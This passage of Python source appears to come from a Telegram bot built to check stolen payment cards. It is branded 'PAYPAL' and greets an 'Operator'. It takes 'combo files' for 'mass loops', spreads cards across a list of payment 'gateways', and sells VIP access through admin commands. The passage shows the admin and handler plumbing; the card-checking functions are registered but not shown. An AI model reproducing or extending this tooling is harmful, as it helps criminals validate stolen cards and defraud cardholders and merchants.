    msg = "🌐 𝐀𝐜𝐭𝐢𝐯𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬:\n\n"
    for i, gateway in enumerate(GATEWAYS, 1):
        msg += f"{i}. <code>{gateway}</code>\n"
    await update.message.reply_text(premium_emoji(msg), parse_mode="HTML")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    uid = int(context.args[0])
    BANNED_USERS[uid] = True
    await update.message.reply_text(premium_emoji("✅ 𝐔𝐬𝐞𝐫 𝐛𝐚𝐧𝐧𝐞𝐝."), parse_mode="HTML")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    uid = int(context.args[0])
    BANNED_USERS.pop(uid, None)
    await update.message.reply_text(premium_emoji("✅ 𝐔𝐬𝐞𝐫 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝."), parse_mode="HTML")

async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    url = context.args[0]
    if url not in GATEWAYS:
        GATEWAYS.append(url)
        await update.message.reply_text(premium_emoji(f"✅ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 #{len(GATEWAYS)} 𝐚𝐝𝐝𝐞𝐝.\n📋 𝐓𝐨𝐭𝐚𝐥: <code>{len(GATEWAYS)}</code>"), parse_mode="HTML")
    else:
        await update.message.reply_text(premium_emoji("⚠️ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐞𝐱𝐢𝐬𝐭𝐬."), parse_mode="HTML")

async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    if GATEWAYS:
        removed = GATEWAYS.pop()
        await update.message.reply_text(premium_emoji(f"🗑 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 #{len(GATEWAYS)+1} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝:\n<code>{removed}</code>"), parse_mode="HTML")
    else:
        await update.message.reply_text(premium_emoji("❌ 𝐍𝐨 𝐠𝐚𝐭𝐞𝐰𝐚𝐲𝐬 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞."), parse_mode="HTML")

async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    target_id, days = int(context.args[0]), int(context.args[1])
    VIP_USERS[target_id] = int(time.time()) + (days * 86400)
    await update.message.reply_text(premium_emoji(f"✅ 𝐕𝐈𝐏 𝐚𝐝𝐝𝐞𝐝 𝐟𝐨𝐫 {days} 𝐝𝐚𝐲𝐬."), parse_mode="HTML")

async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    target_id = int(context.args[0])
    VIP_USERS.pop(target_id, None)
    await update.message.reply_text(premium_emoji("✅ 𝐕𝐈𝐏 𝐫𝐞𝐦𝐨𝐯𝐞𝐝."), parse_mode="HTML")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    welcome_text = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
   🦅   𝐏𝐀𝐘𝐏𝐀𝐋   ⚡
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
  Welcome Operator! System is fully primed.

  • Type <code>/cmds</code> to load global command cluster.
  • Drop combo files directly to activate mass loops.
  • Cards are distributed evenly across all gateways.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    await update.message.reply_text(premium_emoji(welcome_text), parse_mode="HTML")

async def error_handler(update, context):
    pass

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cmds", cmds))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("show_gateways", show_gateways))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(CommandHandler("SENT", sent_broadcast))
    app.add_handler(CommandHandler("add", add_gateway))
    app.add_handler(CommandHandler("rmadd", remove_gateway))
    app.add_handler(CommandHandler("prm", add_prm))
    app.add_handler(CommandHandler("rmprm", remove_prm))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
